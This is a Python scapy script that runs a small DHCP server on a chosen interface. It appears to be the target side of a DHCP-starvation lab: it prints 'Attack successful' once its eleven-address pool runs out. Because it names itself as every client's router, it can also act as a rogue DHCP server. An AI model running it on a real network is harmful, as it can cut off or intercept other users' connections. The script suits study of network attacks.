#!/usr/bin/env python3
# - This implementation was assembled entirely from the references below and with help from ChatGPT.
# References:
# - https://stackoverflow.com/questions/50026438/crafting-a-dhcp-offer-packet-in-scapy
# - https://scapy.readthedocs.io/en/latest/api/scapy.layers.dhcp.html
# - https://gist.github.com/yosshy/4551b1fe3d9af63b02d4

from scapy.all import sniff, sendp, Ether, IP, UDP, BOOTP, DHCP, get_if_hwaddr
import argparse, os, sys

def opts(pkt):
    for o in pkt[DHCP].options:
        if isinstance(o, tuple):
            yield o

def find_opt(pkt, name):
    for k, v in opts(pkt):
        if k == name:
            return v

def mk(pkt, mtype, srv, yi=None):
    return (Ether(src=get_if_hwaddr(iface), dst=pkt[Ether].src)/
            IP(src=srv, dst="255.255.255.255")/
            UDP(sport=67, dport=68)/
            BOOTP(op=2, xid=pkt[BOOTP].xid, yiaddr=yi or "0.0.0.0", siaddr=srv, chaddr=pkt[BOOTP].chaddr)/
            DHCP(options=[("message-type", mtype), ("server_id", srv), ("lease_time", 3600),
                          ("subnet_mask", "255.255.255.0"), ("router", srv), ("name_server", "8.8.8.8"), "end"]))

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("-i", "--interface", default="eth0")
    p.add_argument("-s", "--start-ip", default="192.168.1.100")
    p.add_argument("-e", "--end-ip", default="192.168.1.110")
    p.add_argument("--server-ip", default="192.168.1.1")
    a = p.parse_args()

    iface, a.srv_ip = a.interface, a.server_ip
    if os.geteuid() != 0:
        print("[-] This script must be run as root!")
        sys.exit(1)

    s = int(a.start_ip.split('.')[-1])
    e = int(a.end_ip.split('.')[-1])
    base = '.'.join(a.start_ip.split('.')[:-1])
    pool = [f"{base}.{i}" for i in range(s, e + 1)]

    available = pool.copy()
    leases = {}
    tx = {}

    print(f"[*] DHCP Server started on {iface}")
    print(f"[*] Server IP: {a.srv_ip}")
    print(f"[*] IP Pool: {a.start_ip} - {a.end_ip} ({len(pool)} IPs)")
    print(f"[*] Available IPs: {len(available)}")
    print("[*] DHCP Server is running. Press Ctrl+C to stop.\n")

    def h(pkt):
        if not pkt.haslayer(DHCP):
            return
        mt = find_opt(pkt, "message-type")
        mac = pkt[Ether].src
        xid = pkt[BOOTP].xid
        if mt == 1:
            if not available:
                print(f"[-] IP pool exhausted! Cannot offer IP to {mac}")
                sendp(mk(pkt, "nak", a.srv_ip), iface=iface, verbose=0)
                return
            ip = leases.get(mac, available[0])
            tx[xid] = (mac, ip)
            print(f"[→] DISCOVER from {mac}, offering {ip}")
            sendp(mk(pkt, "offer", a.srv_ip, yi=ip), iface=iface, verbose=0)
        elif mt == 3:
            rip = find_opt(pkt, "requested_addr")
            if xid in tx:
                m, ip = tx[xid]
                if m == mac and ip == rip:
                    if rip in available:
                        available.remove(rip)
                        leases[mac] = rip
                        print(f"[✓] REQUEST from {mac} for {rip} - GRANTED")
                        print(f"    Remaining IPs: {len(available)}/{len(pool)}")
                        sendp(mk(pkt, "ack", a.srv_ip, yi=rip), iface=iface, verbose=0)
                    else:
                        print(f"[-] REQUEST from {mac} for {rip} - DENIED (IP taken)")
                        sendp(mk(pkt, "nak", a.srv_ip), iface=iface, verbose=0)
                else:
                    print(f"[-] Invalid REQUEST from {mac}")
                    sendp(mk(pkt, "nak", a.srv_ip), iface=iface, verbose=0)

    try:
        sniff(filter="udp and (port 67 or port 68)", prn=h, iface=iface, store=0)
    except KeyboardInterrupt:
        print("\n" + "=" * 50)
        print("DHCP SERVER STATISTICS")
        print("=" * 50)
        print(f"Total IP pool size: {len(pool)}")
        print(f"IPs available: {len(available)}")
        print(f"IPs leased: {len(leases)}")
        print(f"Pool utilization: {(len(leases)/len(pool))*100:.1f}%")
        if leases:
            print("\nLeased IPs:")
            for mac, ip in leases.items():
                print(f"  {mac} -> {ip}")
        if not available:
            print("\n[!] IP POOL EXHAUSTED - Attack successful!")
        print("=" * 50)
